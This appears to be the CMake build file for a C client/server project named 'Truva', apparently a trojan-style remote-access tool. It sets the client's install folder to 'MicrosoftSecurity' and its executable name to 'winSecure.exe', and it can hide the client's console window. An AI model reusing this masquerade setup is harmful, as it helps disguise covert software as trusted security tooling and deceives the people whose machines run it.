################################################################################

cmake_minimum_required(VERSION 3.20)

project(Truva)

set(CMAKE_C_STANDARD 99)

################################################################################

message(STATUS "Create macros")

set(USE_LOCAL "1")
set(USE_PROXY "0")
set(OPEN_LOG "1")

set(SERVER_ADDRESS "...")
set(SERVER_PORT "...")

set(MAIN_FOLDER "MicrosoftSecurity")
set(PROGRAM_NAME "winSecure.exe")

################################################################################

message(STATUS "Setting paths")

set(INCDIR_SOCKET_LIB ${CMAKE_SOURCE_DIR}/Socket)
set(SRCDIR_SOCKET_LIB ${CMAKE_SOURCE_DIR}/Socket)
set(SRC_SOCKET_LIB ${SRCDIR_SOCKET_LIB}/eaSCKTBasicComProtocols.c 
                   ${SRCDIR_SOCKET_LIB}/esSCKTBaseDef.c)
set(SRCDIR_SERVER ${CMAKE_SOURCE_DIR}/App/server)
set(SRC_SERVER ${SRCDIR_SERVER}/server.c)
set(INCDIR_CLIENT ${CMAKE_SOURCE_DIR}/App/client)
set(SRCDIR_CLIENT ${CMAKE_SOURCE_DIR}/App/client)
set(SRC_CLIENT ${SRCDIR_CLIENT}/client.c
               ${SRCDIR_CLIENT}/helper.c)

include_directories(${INCDIR_SOCKET_LIB})

################################################################################

message(STATUS "Adding executable and lib")

add_executable(server ${SRC_SERVER})
add_executable(client ${SRC_CLIENT})
add_library(socketlib STATIC ${SRC_SOCKET_LIB})

################################################################################

message(STATUS "Compile configurations")

add_compile_definitions(OPEN_LOG=${OPEN_LOG})
target_compile_definitions(client PUBLIC USE_PROXY=${USE_PROXY}
                                         MAIN_FOLDER=${MAIN_FOLDER}
                                         PROGRAM_NAME=${PROGRAM_NAME})

if(${USE_LOCAL} EQUAL 0)

  message(STATUS "Host and Port macros")
  
  target_compile_definitions(server PUBLIC LISTEN_PORT=${SERVER_PORT})
  target_compile_definitions(client PUBLIC DEST_HOST="${SERVER_ADDRESS}" 
                                           DEST_PORT=${SERVER_PORT})

endif()

add_compile_options(server "-Wall -Wextra -Wconversion")

################################################################################

message(STATUS "Linker configurations")

target_link_libraries(server socketlib pthread)
target_link_libraries(client socketlib pthread)

if(MSYS OR WIN32)

  message(STATUS "Windows")

  target_link_libraries(server wsock32 ws2_32)
  target_link_libraries(client wsock32 ws2_32)

  if(${OPEN_LOG} EQUAL 0)
    target_link_options(client PUBLIC "--machine-windows")
  endif()
  
else()

  message(STATUS "Unix-like :)")
  target_link_libraries(server curses)

endif()

################################################################################
